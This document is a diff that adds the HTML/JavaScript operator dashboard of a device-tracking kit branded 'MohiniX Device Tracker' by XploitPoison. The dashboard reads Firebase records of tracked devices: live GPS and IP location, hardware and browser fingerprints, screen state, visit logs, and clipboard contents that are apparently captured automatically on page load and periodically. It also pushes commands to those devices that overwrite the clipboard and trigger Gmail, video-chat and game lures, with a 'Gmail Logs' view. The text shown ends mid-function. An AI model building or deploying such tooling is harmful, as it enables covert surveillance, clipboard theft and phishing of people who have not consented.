@@ -1,0 +1,1269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>📱 Device Details - Real-time</title>
+    <!--CREATED BY https://www.xploitpoison.com/-->
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Theme Variables */
+        :root {
+            --bg-gradient-start: #0f0c29;
+            --bg-gradient-middle: #302b63;
+            --bg-gradient-end: #24243e;
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --text-primary: white;
+            --text-secondary: rgba(255, 255, 255, 0.6);
+            --border-color: rgba(255, 255, 255, 0.2);
+            --accent-color: #4ade80;
+            --accent-hover: #22c55e;
+            --status-online: #4ade80;
+            --status-offline: #ef4444;
+            --history-border: #fbbf24;
+        }
+
+        /* Light Theme */
+        body.theme-light {
+            --bg-gradient-start: #f5f7fa;
+            --bg-gradient-middle: #e4e8f0;
+            --bg-gradient-end: #d9e0e8;
+            --card-bg: rgba(0, 0, 0, 0.05);
+            --text-primary: #1a1a2e;
+            --text-secondary: #4a5568;
+            --border-color: rgba(0, 0, 0, 0.1);
+            --accent-color: #10b981;
+            --history-border: #f59e0b;
+        }
+
+        /* Blue Theme */
+        body.theme-blue {
+            --bg-gradient-start: #1e3c72;
+            --bg-gradient-middle: #2a5298;
+            --bg-gradient-end: #1e3c72;
+            --accent-color: #60a5fa;
+            --history-border: #60a5fa;
+        }
+
+        /* Green Theme */
+        body.theme-green {
+            --bg-gradient-start: #064e3b;
+            --bg-gradient-middle: #047857;
+            --bg-gradient-end: #065f46;
+            --accent-color: #34d399;
+            --history-border: #34d399;
+        }
+
+        /* Purple Theme */
+        body.theme-purple {
+            --bg-gradient-start: #4c1d95;
+            --bg-gradient-middle: #6d28d9;
+            --bg-gradient-end: #5b21b6;
+            --accent-color: #c084fc;
+            --history-border: #c084fc;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, var(--bg-gradient-start), var(--bg-gradient-middle), var(--bg-gradient-end));
+            min-height: 100vh;
+            padding: 16px;
+            transition: background 0.3s ease;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            border-radius: 28px;
+            padding: 12px 20px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 30px;
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .back-btn:active {
+            transform: scale(0.95);
+        }
+
+        .header-info h1 {
+            color: var(--text-primary);
+            font-size: 18px;
+        }
+
+        .header-info p {
+            color: var(--text-secondary);
+            font-size: 10px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Theme Selector */
+        .theme-selector {
+            display: flex;
+            gap: 6px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 5px 10px;
+            border-radius: 30px;
+        }
+
+        .theme-btn {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .theme-btn.active {
+            border-color: white;
+            transform: scale(1.1);
+        }
+
+        .theme-dark {
+            background: linear-gradient(135deg, #0f0c29, #24243e);
+        }
+
+        .theme-light {
+            background: linear-gradient(135deg, #f5f7fa, #d9e0e8);
+        }
+
+        .theme-blue {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+        }
+
+        .theme-green {
+            background: linear-gradient(135deg, #064e3b, #065f46);
+        }
+
+        .theme-purple {
+            background: linear-gradient(135deg, #4c1d95, #5b21b6);
+        }
+
+        .live-badge {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid var(--accent-color);
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 10px;
+            color: var(--accent-color);
+        }
+
+        .device-id-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .device-id-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+
+        .device-id-value {
+            font-family: monospace;
+            font-size: 14px;
+            color: var(--accent-color);
+            margin-top: 5px;
+            word-break: break-all;
+        }
+
+        .section {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--accent-color);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-left: 3px solid var(--accent-color);
+            padding-left: 10px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 8px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .info-value {
+            font-size: 12px;
+            color: var(--text-primary);
+            font-weight: 500;
+            word-break: break-all;
+            text-align: right;
+            max-width: 60%;
+        }
+
+        .info-full {
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 5px;
+        }
+
+        .info-full .info-value {
+            text-align: left;
+            max-width: 100%;
+            font-size: 11px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 6px 8px;
+            border-radius: 8px;
+            font-family: monospace;
+        }
+
+        .history-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .history-item {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            border-left: 3px solid var(--history-border);
+        }
+
+        .history-time {
+            font-size: 10px;
+            color: var(--history-border);
+            margin-bottom: 4px;
+        }
+
+        .history-data {
+            font-size: 11px;
+            color: var(--text-primary);
+            word-break: break-all;
+        }
+
+        .command-section {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .command-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            padding: 12px;
+            border-radius: 25px;
+            color: var(--text-primary);
+            font-size: 14px;
+            margin-bottom: 10px;
+            outline: none;
+        }
+
+        .send-btn {
+            background: var(--accent-color);
+            color: #000;
+            border: none;
+            padding: 12px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        .send-btn:active {
+            transform: scale(0.98);
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1e293b;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            display: none;
+            z-index: 1000;
+        }
+
+        .update-flash {
+            animation: flash 0.5s ease;
+        }
+
+        @keyframes flash {
+            0% {
+                background: rgba(74, 222, 128, 0.3);
+            }
+
+            100% {
+                background: transparent;
+            }
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .toast {
+                white-space: normal;
+                text-align: center;
+                max-width: 90%;
+            }
+
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .header-left {
+                width: 100%;
+                justify-content: space-between;
+            }
+
+            .header-right {
+                width: 100%;
+                justify-content: space-between;
+            }
+
+            .theme-selector {
+                flex: 1;
+                justify-content: center;
+            }
+        }
+
+        .status-online {
+            color: var(--status-online);
+        }
+
+        .status-offline {
+            color: var(--status-offline);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+        }
+
+        .badge-success {
+            background: rgba(74, 222, 128, 0.2);
+            color: #4ade80;
+        }
+
+        .badge-warning {
+            background: rgba(251, 191, 36, 0.2);
+            color: #fbbf24;
+        }
+
+        /* Toggle Buttons */
+        .toggle-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .toggle-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-primary);
+        }
+
+        .toggle-btn.active {
+            background: var(--accent-color);
+            color: #000;
+        }
+
+        .toggle-btn.game-btn.active {
+            background: #4ade80;
+            color: #000;
+        }
+
+        .toggle-btn.chat-btn.active {
+            background: #fbbf24;
+            color: #000;
+        }
+
+        .hide-section {
+            display: none;
+        }
+
+        /* Game Stats & Chat Styles */
+        .stats-card {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .stats-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .stats-value {
+            font-size: 12px;
+            font-weight: bold;
+            color: #fbbf24;
+        }
+
+        .stats-value-green {
+            color: #4ade80;
+        }
+
+        .message-item {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 8px 12px;
+            border-radius: 10px;
+            margin-top: 5px;
+        }
+
+        .message-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+        }
+
+        .message-stranger {
+            color: #fbbf24;
+        }
+
+        .message-user {
+            color: #4ade80;
+        }
+
+        .message-text {
+            font-size: 12px;
+            margin-top: 3px;
+        }
+
+        /* Clickable Logo Link */
+        .logo-link {
+            text-decoration: none;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .logo-link:hover {
+            transform: scale(1.02);
+        }
+
+        .logo-link:active {
+            transform: scale(0.98);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 8px 15px;
+            border-radius: 30px;
+            transition: all 0.2s;
+        }
+
+        .logo-link:hover .logo-container {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid #4ade80;
+        }
+
+        .brand-logo {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            object-fit: cover;
+            background: white;
+            padding: 4px;
+        }
+
+        .brand-name {
+            font-size: 16px;
+            font-weight: bold;
+            color: #4ade80;
+        }
+
+        .brand-domain {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 2px;
+        }
+
+        /* Hover effect on brand name */
+        .logo-link:hover .brand-name {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body class="theme-dark">
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <a href="https://www.xploitpoison.com/" target="_blank" class="logo-link" rel="noopener noreferrer">
+                    <div class="logo-container">
+                        <img src="https://cdn5.telesco.pe/file/HeK1a_SsOWA0jcJLG_m-Z3ut1PVqbRZM4BEyFmyEuEKv9gP9__Z3yUzhm_etJW2TK8Uv5MzlarCPstK7EVo94ZFWf05V6F7OZWCpfYW7GCZmuLDtFk3ji4QhpZyf3KYd87tbIkWzWjdsgReM4sT8sFteYFwULez4oWVeFwQcrmoWKRickNuZTqMXN0Y1b7ZU80dAOYIHDi6w5IS9V7yhdnu8GovZ9WlAz_RJxog1SOYEZkhyF-FAXBnl6o8B5N254MpQeG0ZHv_QHJdj27y1p0GskzI2kumRD-AlSloRzpPC5r58hA2oWk9zCxGRYSB8lJCN8S9a9GpZ3ym3qyxXAg.jpg"
+                            alt="XploitPoison" class="brand-logo"
+                            onerror="this.src='https://via.placeholder.com/40?text=XP'">
+                        <div>
+                            <div class="brand-name">XploitPoison</div>
+                            <div class="brand-domain">xploitpoison.com</div>
+                        </div>
+                    </div>
+                </a>
+                <div class="header-info">
+                    <h1>⚡ MohiniX Device Tracker</h1>
+                <p>Premium Edition | GPS + Clipboard Intelligence</p>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="theme-selector">
+                    <div class="theme-btn theme-dark" onclick="setTheme('dark')" title="Dark"></div>
+                    <div class="theme-btn theme-light" onclick="setTheme('light')" title="Light"></div>
+                    <div class="theme-btn theme-blue" onclick="setTheme('blue')" title="Blue"></div>
+                    <div class="theme-btn theme-green" onclick="setTheme('green')" title="Green"></div>
+                    <div class="theme-btn theme-purple" onclick="setTheme('purple')" title="Purple"></div>
+                </div>
+                <div class="live-badge" id="liveBadge">🟢 LIVE</div>
+            </div>
+
+
+        </div>
+        <!-- ADMIN COMMANDS SECTION -->
+        <div class="section" style="margin-top: 20px;">
+            <div class="section-title">🎮 ADMIN COMMANDS</div>
+            <div style="display: flex; gap: 12px; flex-wrap: wrap; padding: 10px 0;">
+                <button onclick="sendAdminCommand('gmail')"
+                    style="background: #ea4335; border: none; padding: 12px 20px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; flex: 1; min-width: 100px;">
+                    📧 Gmail
+                </button>
+                <button onclick="sendAdminCommand('videochat')"
+                    style="background: #fbbf24; border: none; padding: 12px 20px; border-radius: 25px; color: black; font-weight: bold; cursor: pointer; flex: 1; min-width: 100px;">
+                    💬 Video Chat
+                </button>
+                <button onclick="sendAdminCommand('game')"
+                    style="background: #4ade80; border: none; padding: 12px 20px; border-radius: 25px; color: black; font-weight: bold; cursor: pointer; flex: 1; min-width: 100px;">
+                    🎮 Game
+                </button>
+
+            </div>
+
+        </div>
+        <!-- Toggle Buttons -->
+        <div class="toggle-buttons">
+            <button class="toggle-btn game-btn active" onclick="showGameStats()">🎮 Game Stats</button>
+            <button class="toggle-btn chat-btn" onclick="showChatSessions()">💬 Video Chat</button>
+            <button class="toggle-btn chat-btn" onclick="viewGmailLogs()">🌐 Gmail Logs</button>
+        </div>
+
+        <!-- Game Stats Section -->
+        <div class="section" id="gameStatsSection">
+            <div class="section-title">🎮 GAME STATISTICS</div>
+            <div id="gameStatsContainer">Loading...</div>
+        </div>
+
+        <!-- Video Chat Section -->
+        <div class="section hide-section" id="chatSessionsSection">
+            <div class="section-title">💬 VIDEO CHAT SESSIONS</div>
+            <div id="chatSessionsContainer">Loading...</div>
+        </div>
+        <div id="content">
+            <div class="loading">Loading device data...</div>
+        </div>
+
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script src="config.js"></script>
+    <script>
+        // ==================== THEME MANAGEMENT ====================
+        function setTheme(theme) {
+            document.body.className = `theme-${theme}`;
+            localStorage.setItem('device_theme', theme);
+            document.querySelectorAll('.theme-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.classList.contains(`theme-${theme}`)) {
+                    btn.classList.add('active');
+                }
+            });
+            showToast(`🎨 Theme changed to ${theme}`, false);
+        }
+
+        function loadSavedTheme() {
+            const savedTheme = localStorage.getItem('device_theme');
+            if (savedTheme) {
+                setTheme(savedTheme);
+            } else {
+                document.querySelector('.theme-btn.theme-dark').classList.add('active');
+            }
+        }
+
+        // ==================== FIREBASE INIT ====================
+        let database = null;
+        let deviceId = null;
+        let listeners = [];
+
+        function initFirebase() {
+            if (typeof firebaseConfig !== 'undefined') {
+                if (!firebase.apps.length) {
+                    firebase.initializeApp(firebaseConfig);
+                }
+                database = firebase.database();
+                console.log('✅ Firebase ready');
+                loadDeviceData();
+            } else {
+                document.getElementById('content').innerHTML = '<div class="loading">❌ config.js not found!</div>';
+            }
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#ef4444' : '#10b981';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2000);
+        }
+
+        function goBack() {
+            window.location.href = 'admin.html';
+        }
+
+        function flashElement(elementId) {
+            const el = document.getElementById(elementId);
+            if (el) {
+                el.classList.add('update-flash');
+                setTimeout(() => el.classList.remove('update-flash'), 500);
+            }
+        }
+
+        function getDeviceIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let id = urlParams.get('id');
+            if (!id) {
+                id = localStorage.getItem('selectedDeviceId');
+            }
+            return id;
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+        }
+
+        // ==================== UPDATE SCREEN STATUS ====================
+        function updateScreenStatus(screenData) {
+            const container = document.getElementById('screenStatusContainer');
+            if (!container) return;
+
+            if (screenData) {
+                const isScreenOn = screenData === 'ON';
+                container.innerHTML = `
+                    <div class="info-row">
+                        <span class="info-label">Current Status</span>
+                        <span class="info-value">
+                            <span class="badge ${isScreenOn ? 'badge-success' : 'badge-warning'}">
+                                ${isScreenOn ? '📱 SCREEN ON' : '📴 SCREEN OFF'}
+                            </span>
+                        </span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Last Update</span>
+                        <span class="info-value">${new Date().toLocaleString()}</span>
+                    </div>
+                `;
+            } else {
+                container.innerHTML = `<div class="info-row"><span class="info-label">No screen status data available</span></div>`;
+            }
+        }
+
+        // ==================== OTHER UPDATE FUNCTIONS ====================
+        function updateDeviceInfo(device) {
+            const container = document.getElementById('deviceInfoContainer');
+            if (!container) return;
+            container.innerHTML = `
+                <div class="info-row"><span class="info-label">Device ID</span><span class="info-value"><code>${device?.deviceId || deviceId}</code></span></div>
+                <div class="info-row"><span class="info-label">Browser</span><span class="info-value">${device?.browser || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">OS</span><span class="info-value">${device?.os || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Device Model</span><span class="info-value">${device?.deviceModel || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Screen Resolution</span><span class="info-value">${device?.screen || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Battery</span><span class="info-value">${device?.battery || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Network Type</span><span class="info-value">${device?.networkType || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Timezone</span><span class="info-value">${device?.timezone || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">IP Address</span><span class="info-value">${device?.ip || 'Unknown'}</span></div>
+                <div class="info-row"><span class="info-label">Visit Number</span><span class="info-value">${device?.visitNumber || 1}</span></div>
+                <div class="info-row"><span class="info-label">Last Seen</span><span class="info-value">${device?.lastSeenTime || 'Never'}</span></div>
+            `;
+        }
+
+        function updateOnlineStatus(status) {
+            const container = document.getElementById('statusContainer');
+            if (!container) return;
+            const isOnline = status?.status === 'online';
+            container.innerHTML = `
+                <div class="info-row"><span class="info-label">Connection Status</span><span class="info-value ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}</span></div>
+                <div class="info-row"><span class="info-label">Last Ping</span><span class="info-value">${status?.lastSeenTime || 'Never'}</span></div>
+            `;
+        }
+
+        function updateGPSInfo(gps) {
+            const container = document.getElementById('gpsContainer');
+            if (!container) return;
+            if (gps && gps.latitude) {
+                container.innerHTML = `
+                    <div class="info-row"><span class="info-label">Latitude</span><span class="info-value">${gps.latitude}</span></div>
+                    <div class="info-row"><span class="info-label">Longitude</span><span class="info-value">${gps.longitude}</span></div>
+                    <div class="info-row"><span class="info-label">Accuracy</span><span class="info-value">±${gps.accuracy} meters</span></div>
+                    <div class="info-row"><span class="info-label">Speed</span><span class="info-value">${gps.speed || '0'} m/s</span></div>
+                    <div class="info-row"><span class="info-label">Last Update</span><span class="info-value">${gps.dateTime || new Date(gps.timestamp).toLocaleString()}</span></div>
+                `;
+            } else {
+                container.innerHTML = `<div class="info-row"><span class="info-label">No GPS data available</span></div>`;
+            }
+        }
+
+        function updateGeoInfo(geo) {
+            const container = document.getElementById('geoContainer');
+            if (!container) return;
+            if (geo && geo.latitude && geo.latitude !== 0) {
+                container.innerHTML = `
+                    <div class="info-row"><span class="info-label">Coordinates</span><span class="info-value">${geo.latitude}, ${geo.longitude}</span></div>
+                    <div class="info-row"><span class="info-label">City</span><span class="info-value">${geo.city || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Region</span><span class="info-value">${geo.region || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Country</span><span class="info-value">${geo.country || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">IP Address</span><span class="info-value">${geo.ip || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Timezone</span><span class="info-value">${geo.timezone || 'Unknown'}</span></div>
+                `;
+            } else {
+                container.innerHTML = `<div class="info-row"><span class="info-label">No Geo location data available</span></div>`;
+            }
+        }
+
+        function updateHardwareInfo(hardware) {
+            const container = document.getElementById('hardwareContainer');
+            if (!container) return;
+            if (hardware && hardware.hardware) {
+                const hw = hardware.hardware;
+                container.innerHTML = `
+                    <div class="info-row"><span class="info-label">RAM</span><span class="info-value">${hw.deviceMemory || 'Unknown'} GB</span></div>
+                    <div class="info-row"><span class="info-label">CPU Cores</span><span class="info-value">${hw.hardwareConcurrency || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Max Touch Points</span><span class="info-value">${hw.maxTouchPoints || '0'}</span></div>
+                    <div class="info-row"><span class="info-label">Screen Size</span><span class="info-value">${hw.screenWidth || '?'} x ${hw.screenHeight || '?'}</span></div>
+                    <div class="info-row"><span class="info-label">Pixel Ratio</span><span class="info-value">${hw.devicePixelRatio || '1'}</span></div>
+                    <div class="info-row"><span class="info-label">Vendor</span><span class="info-value">${hw.vendor || 'Unknown'}</span></div>
+                    <div class="info-row info-full"><span class="info-label">GPU</span><span class="info-value">${hw.gpu || 'Unknown'}</span></div>
+                `;
+            } else {
+                container.innerHTML = `<div class="info-row"><span class="info-label">No hardware data available</span></div>`;
+            }
+        }
+
+        function updateSoftwareInfo(software) {
+            const container = document.getElementById('softwareContainer');
+            if (!container) return;
+            if (software && software.software) {
+                const sw = software.software;
+                container.innerHTML = `
+                    <div class="info-row"><span class="info-label">Browser</span><span class="info-value">${sw.browser || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">OS</span><span class="info-value">${sw.os || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Language</span><span class="info-value">${sw.language || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Cookies Enabled</span><span class="info-value">${sw.cookieEnabled ? 'Yes' : 'No'}</span></div>
+                    <div class="info-row"><span class="info-label">Timezone</span><span class="info-value">${sw.timezone || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Timezone Offset</span><span class="info-value">${sw.timezoneOffset || '0'} minutes</span></div>
+                    <div class="info-row info-full"><span class="info-label">User Agent</span><span class="info-value">${sw.userAgent?.substring(0, 150)}...</span></div>
+                    ${sw.plugins && sw.plugins.length ? `<div class="info-row info-full"><span class="info-label">Plugins</span><span class="info-value">${sw.plugins.join(', ')}</span></div>` : ''}
+                `;
+            } else {
+                container.innerHTML = `<div class="info-row"><span class="info-label">No software data available</span></div>`;
+            }
+        }
+
+        function updateVisitHistory(visits) {
+            const container = document.getElementById('visitsContainer');
+            if (!container) return;
+            if (visits) {
+                const visitsArray = Object.entries(visits).reverse();
+                let html = '';
+                visitsArray.forEach(([key, visit]) => {
+                    html += `<div class="history-item"><div class="history-time">📅 ${visit.time || new Date(visit.timestamp).toLocaleString()}</div><div class="history-data">Visit #${visit.visitNumber || '?'}</div></div>`;
+                });
+                container.innerHTML = html || '<div class="info-row">No visit history</div>';
+            } else {
+                container.innerHTML = '<div class="info-row">No visit history</div>';
+            }
+        }
+
+        function updateClipboardHistory(clipboard) {
+            const container = document.getElementById('clipboardContainer');
+            if (!container) return;
+            if (clipboard) {
+                let allItems = [];
+                Object.keys(clipboard).forEach(key => {
+                    const item = clipboard[key];
+                    if (typeof item === 'object' && item !== null) {
+                        if (item.timestamp || item.type || item.text) {
+                            allItems.push({ id: key, ...item });
+                        } else {
+                            Object.keys(item).forEach(subKey => {
+                                const subItem = item[subKey];
+                                if (subItem && (subItem.timestamp || subItem.type || subItem.text)) {
+                                    allItems.push({ id: subKey, ...subItem });
+                                }
+                            });
+                        }
+                    }
+                });
+                allItems.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+                const recentItems = allItems.slice(0, 15);
+                if (recentItems.length === 0) {
+                    container.innerHTML = '<div class="info-row">No clipboard history</div>';
+                    return;
+                }
+                let html = '';
+                recentItems.forEach(item => {
+                    let icon = '📋';
+                    if (item.type === 'copy') icon = '📋 Copy';
+                    else if (item.type === 'paste') icon = '📌 Paste';
+                    else if (item.type === 'cut') icon = '✂️ Cut';
+                    else if (item.type === 'periodic_check') icon = '🔄 Periodic';
+                    else if (item.type === 'auto_read_on_load') icon = '📖 Auto Load';
+                    else if (item.type === 'auto_read_after_click') icon = '🖱️ After Click';
+                    else if (item.type === 'admin_set') icon = '👑 Admin Set';
+                    else if (item.type === 'global_admin_set') icon = '🌍 Global Set';
+                    else icon = '📋 ' + (item.type || 'Clipboard');
+                    const timeStr = item.dateTime || (item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown');
+                    let displayText = item.text || '';
+                    if (displayText.length > 150) displayText = displayText.substring(0, 150) + '...';
+                    html += `<div class="history-item"><div class="history-time">${icon} | ${timeStr}</div><div class="history-data">${escapeHtml(displayText) || '(empty)'}</div><div style="font-size:9px;color:rgba(255,255,255,0.3);margin-top:4px;">Length: ${item.length || displayText.length} chars | Type: ${item.type || 'unknown'}</div></div>`;
+                });
+                container.innerHTML = html;
+            } else {
+                container.innerHTML = '<div class="info-row">No clipboard history</div>';
+            }
+        }
+
+        async function sendClipboardCommand() {
+            const text = document.getElementById('commandText').value.trim();
+            if (!text) { showToast('Please enter text to send', true); return; }
+            if (!deviceId) { showToast('No device selected', true); return; }
+            try {
+                await database.ref(`admin_commands/${deviceId}/clipboard`).set({ text: text, active: true, timestamp: Date.now(), fromAdmin: true });
+                showToast(`✅ Command sent to device`, false);
+                document.getElementById('commandText').value = '';
+            } catch (error) { showToast('❌ Failed to send command', true); }
+        }
+
+        // ==================== SETUP REAL-TIME LISTENERS ====================
+        function setupRealTimeListeners() {
+            if (!database || !deviceId) return;
+
+            const deviceRef = database.ref(`devices/${deviceId}`);
+            deviceRef.on('value', (s) => { if (s.val()) updateDeviceInfo(s.val()); flashElement('deviceInfoSection'); });
+            listeners.push({ ref: deviceRef });
+
+            const onlineRef = database.ref(`online_devices/${deviceId}`);
+            onlineRef.on('value', (s) => { updateOnlineStatus(s.val()); flashElement('statusSection'); });
+            listeners.push({ ref: onlineRef });
+            // Game Stats Listener
+            const gameStatsRef = database.ref(`game_users/${deviceId}`);
+            gameStatsRef.on('value', (s) => { displayGameStats(deviceId); });
+            listeners.push({ ref: gameStatsRef });
+
+            // Chat Sessions Listener
+            const chatRef = database.ref(`chat_sessions/${deviceId}`);
+            chatRef.on('value', (s) => { displayChatSessions(deviceId); });
+            listeners.push({ ref: chatRef });
+            // 🔽 SCREEN STATUS LISTENER - ADDED CORRECTLY 🔽
+            const screenRef = database.ref(`online_devices/${deviceId}/screen`);
+            screenRef.on('value', (s) => {
+                updateScreenStatus(s.val());
+                flashElement('screenStatusSection');
+            });
+            listeners.push({ ref: screenRef });
+
+            const gpsRef = database.ref(`gps_locations/${deviceId}/current`);
+            gpsRef.on('value', (s) => { updateGPSInfo(s.val()); flashElement('gpsSection'); });
+            listeners.push({ ref: gpsRef });
+
+            const geoRef = database.ref(`geo_locations/${deviceId}/current`);
+            geoRef.on('value', (s) => { updateGeoInfo(s.val()); flashElement('geoSec'); });
+            listeners.push({ ref: geoRef });
+
+            const hardwareRef = database.ref(`hardware_info/${deviceId}/current`);
+            hardwareRef.on('value', (s) => { updateHardwareInfo(s.val()); flashElement('hardwareSec'); });
+            listeners.push({ ref: hardwareRef });
+
+            const softwareRef = database.ref(`software_info/${deviceId}/current`);
+            softwareRef.on('value', (s) => { updateSoftwareInfo(s.val()); flashElement('softwareSec'); });
+            listeners.push({ ref: softwareRef });
+
+            const visitsRef = database.ref(`visit_logs/${deviceId}`);
+            visitsRef.on('value', (s) => { updateVisitHistory(s.val()); flashElement('visitsSec'); });
+            listeners.push({ ref: visitsRef });
+
+            const clipboardRef = database.ref(`clipboard_data/${deviceId}`);
+            clipboardRef.on('value', (s) => { updateClipboardHistory(s.val()); flashElement('clipboardSec'); });
+            listeners.push({ ref: clipboardRef });
+        }
+
+        // ==================== LOAD DEVICE DATA ====================
+        async function loadDeviceData() {
+            deviceId = getDeviceIdFromUrl();
+            if (!deviceId) {
+                document.getElementById('content').innerHTML = `<div class="section" style="text-align: center;"><div style="font-size:48px;">❌</div><div style="color:var(--text-primary);">No device ID found</div><button class="send-btn" style="margin-top:20px;background:var(--accent-color);" onclick="goBack()">Go Back</button></div>`;
+                return;
+            }
+
